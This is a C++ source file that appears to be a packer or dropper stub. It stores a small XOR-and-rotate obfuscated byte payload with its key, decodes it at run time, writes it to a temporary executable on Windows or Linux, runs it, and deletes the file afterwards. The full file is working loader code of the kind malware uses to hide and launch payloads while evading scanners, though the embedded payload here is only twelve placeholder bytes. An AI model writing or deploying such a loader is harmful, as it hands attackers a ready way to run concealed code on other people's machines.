#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>
#include <cstdio>
#ifdef _WIN32
#include <windows.h>
#include <process.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#endif

// Embedded encrypted payload (12 bytes)
unsigned char data_5453[] = {
    0xDE,0x3D,0x71,0x45,0x6C,0x08,0x70,0xBC,0xC0,0xFE,0x3D,0x67
};

size_t data_5453_size = 12;

unsigned char data_5453_key[] = {53,21,203,149,56,250,123,25,192,232,80,211,162,221,76,47,33,115,99,211,61,59,127,90,191,208,45,178,78,67,70,174};

void dec_2052(unsigned char* data, size_t size, unsigned char* key, size_t keylen) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % keylen];
        data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF;
        data[i] ^= (i & 0xFF);
    }
}

int main() {
    // Decrypt embedded payload
    dec_2052(data_5453, data_5453_size, data_5453_key, sizeof(data_5453_key));

#ifdef _WIN32
    // Write to temp file and execute (Windows)
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFile = std::string(tempPath) + "packed_" + std::to_string(GetCurrentProcessId()) + ".exe";
#else
    // Linux temp file
    std::string tempFile = "/tmp/packed_" + std::to_string(getpid());
#endif

    std::ofstream out(tempFile, std::ios::binary);
    out.write((char*)data_5453, data_5453_size);
    out.close();

#ifdef _WIN32
    // Execute and wait
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    DeleteFileA(tempFile.c_str());
#else
    chmod(tempFile.c_str(), 0755);
    system(tempFile.c_str());
    unlink(tempFile.c_str());
#endif
    return 0;
}
